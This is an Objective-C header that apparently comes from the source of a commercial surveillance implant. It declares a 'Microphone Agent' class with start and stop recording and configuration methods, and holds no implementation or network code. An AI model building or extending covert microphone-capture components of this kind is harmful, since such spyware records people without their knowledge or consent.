/*
 * RCSIAgentMicrophone.h
 *  Microphone Agent - acts as a controller for the RCSIMicrophoneRecorder
 *
 *
 * Created on 07/10/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Foundation/Foundation.h>

#ifndef __RCSIAgentMicrophone_h__
#define __RCSIAgentMicrophone_h__

#import "RCSIAgent.h"
#import "RCSICommon.h"
#import "RCSIMicrophoneRecorder.h"


@interface _i_AgentMicrophone : _i_Agent <Agents>
{
@private
  BOOL                 mIsRunning;

@private
  _i_MicrophoneRecorder *mRecorder;
  BOOL                    mPlaybackWasInterrupted;
  BOOL                    mPlaybackWasPaused;
  CFStringRef             mRecordFilePath;
}

@property (readonly)          _i_MicrophoneRecorder *mRecorder;
@property (readonly)          BOOL                    mIsRunning;
@property                     BOOL                    mPlaybackWasInterrupted;

- (id)initWithConfigData:(NSData *)aData;
- (void)startRecord;
- (void)stopRecord;
- (void)setupAudioQueue;

@end

#endif